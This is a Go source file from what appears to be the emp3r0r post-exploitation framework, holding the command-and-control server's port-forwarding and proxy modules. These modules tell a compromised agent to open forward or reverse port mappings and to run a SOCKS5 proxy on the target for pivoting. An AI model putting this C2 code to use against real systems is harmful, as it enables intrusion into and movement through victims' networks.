package cc

import (
	"context"
	"fmt"

	"github.com/google/uuid"
	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

func modulePortFwd() {
	switch Options["switch"].Val {
	case "off":
		// ugly, i know, it will delete port mappings matching current lport-to combination
		for id, session := range PortFwds {
			if session.To == Options["to"].Val && session.Lport == Options["listen_port"].Val {
				session.Cancel()     // cancel the PortFwd session
				delete(PortFwds, id) // remove from port mapping list

				// tell the agent to close connection
				// make sure handler returns
				// cmd format: !port_fwd [to/listen] [shID] [operation]
				cmd := fmt.Sprintf("%s %s stop stop", emp3r0r_data.C2CmdPortFwd, id)
				err := SendCmd(cmd, "", CurrentTarget)
				if err != nil {
					CliPrintError("SendCmd: %v", err)
					return
				}
				return
			}
			CliPrintError("Could not find port mapping (to %s, listening on %s)",
				Options["to"].Val, Options["listen_port"].Val)
		}
	case "reverse": // expose a dest from CC to agent
		var pf PortFwdSession
		pf.Ctx, pf.Cancel = context.WithCancel(context.Background())
		pf.Lport, pf.To = Options["listen_port"].Val, Options["to"].Val
		go func() {
			err := pf.InitReversedPortFwd()
			if err != nil {
				CliPrintError("PortFwd (reverse) failed: %v", err)
			}
		}()
	case "on":
		var pf PortFwdSession
		pf.Ctx, pf.Cancel = context.WithCancel(context.Background())
		pf.Lport, pf.To = Options["listen_port"].Val, Options["to"].Val
		go func() {
			err := pf.RunPortFwd()
			if err != nil {
				CliPrintError("PortFwd failed: %v", err)
			}
		}()
	default:
	}
}

func moduleProxy() {
	port := Options["port"].Val
	status := Options["status"].Val

	// port-fwd
	var pf PortFwdSession
	pf.Ctx, pf.Cancel = context.WithCancel(context.Background())
	pf.Lport, pf.To = port, "127.0.0.1:"+RuntimeConfig.AutoProxyPort
	pf.Description = fmt.Sprintf("Agent Proxy:\n%s (Local) -> %s (Agent)", pf.Lport, pf.To)

	switch status {
	case "on":
		// tell agent to start local socks5 proxy
		cmd_id := uuid.NewString()
		err = SendCmdToCurrentTarget("!proxy on 0.0.0.0:"+RuntimeConfig.AutoProxyPort, cmd_id)
		if err != nil {
			CliPrintError("Starting SOCKS5 proxy on target failed: %v", err)
			return
		}
		var ok bool
		for i := 0; i < 120; i++ {
			_, ok = CmdResults[cmd_id]
			if ok {
				break
			}
			util.TakeABlink()
		}

		if !ok {
			CliPrintError("Timeout waiting for agent to start SOCKS5 proxy")
			return
		} else {
			// port mapping of default socks5 proxy
			go func() {
				err := pf.RunPortFwd()
				if err != nil {
					CliPrintError("PortFwd failed: %v", err)
				}
			}()
		}
	case "off":
		for id, session := range PortFwds {
			if session.Description == pf.Description {
				session.Cancel() // cancel the PortFwd session

				// tell the agent to close connection
				// make sure handler returns
				cmd := fmt.Sprintf("%s %s", emp3r0r_data.C2CmdDeletePortFwd, id)
				err := SendCmd(cmd, "", session.Agent)
				if err != nil {
					CliPrintError("SendCmd: %v", err)
					return
				}
			}
		}
	default:
		CliPrintError("Unknown operation '%s'", status)
	}
}
